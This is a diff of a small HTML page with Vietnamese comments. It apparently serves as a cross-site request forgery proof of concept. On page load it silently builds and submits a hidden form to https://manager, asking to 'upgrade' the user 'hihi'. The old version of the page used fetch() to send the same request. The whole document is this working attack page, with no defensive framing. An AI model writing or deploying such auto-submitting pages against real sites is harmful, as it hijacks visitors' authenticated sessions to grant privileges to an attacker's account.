@@ -2,32 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Auto POST Example</title>
+    <title>Auto POST Page</title>
     <script>
-        window.onload = async function() {
-            try {
-                const response = await fetch('https://manager', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    },
-                    body: new URLSearchParams({
-                        'username': 'hihi',
-                        'upgrade': 'true'
-                    })
-                });
-                const status = response.status;
-                const responseBody = await response.text();
-                console.log('Response status:', status);
-                console.log('Response body:', responseBody);
-            } catch (error) {
-                console.error('Error during POST:', error);
-            }
-        };
+        // Hàm này sẽ gửi yêu cầu POST khi trang được tải lên
+        function sendPostRequest() {
+            // Tạo một biểu mẫu (form) để gửi yêu cầu POST
+            var form = document.createElement('form');
+            form.method = 'POST'; // Chỉ định phương thức POST
+            form.action = 'https://manager'; // URL để gửi yêu cầu POST
+
+            // Tạo các trường ẩn để chứa dữ liệu POST
+            var usernameInput = document.createElement('input');
+            usernameInput.type = 'hidden';
+            usernameInput.name = 'username';
+            usernameInput.value = 'hihi'; // Giá trị cho username
+
+            var upgradeInput = document.createElement('input');
+            upgradeInput.type = 'hidden';
+            upgradeInput.name = 'upgrade';
+            upgradeInput.value = '1'; // Giá trị cho upgrade
+
+            // Thêm các trường ẩn vào biểu mẫu
+            form.appendChild(usernameInput);
+            form.appendChild(upgradeInput);
+
+            // Thêm biểu mẫu vào body và gửi nó
+            document.body.appendChild(form); // Đảm bảo biểu mẫu là một phần của DOM
+            form.submit(); // Gửi biểu mẫu
+        }
+
+        // Gọi hàm này khi trang được tải lên
+        window.onload = sendPostRequest;
     </script>
 </head>
 <body>
-    <h1>Auto POST Example</h1>
-    <p>Yêu cầu POST đã được gửi đến http://manager.</p>
+    <h1>Sending POST Request...</h1>
+    <p>This page will automatically send a POST request to the specified URL.</p>
 </body>
 </html>
